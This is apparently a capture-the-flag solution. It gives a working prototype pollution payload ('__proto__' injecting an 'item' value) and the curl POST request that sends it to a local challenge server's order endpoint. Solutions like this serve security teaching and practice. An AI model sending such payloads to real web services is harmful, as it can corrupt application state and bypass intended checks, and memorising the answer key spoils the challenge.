# solution
- post a request with a prototype pollution (`__proto__`) for the "item" field.
- POST body: `{"amount": 1, "__proto__": { "item": "🚩" }}`

```
curl --location --request POST 'http://localhost:2210/order' \
--header 'Content-Type: application/json' \
--data-raw '{"amount": 1, "nope": "🧋", "__proto__": { "item": "🚩" }}'
```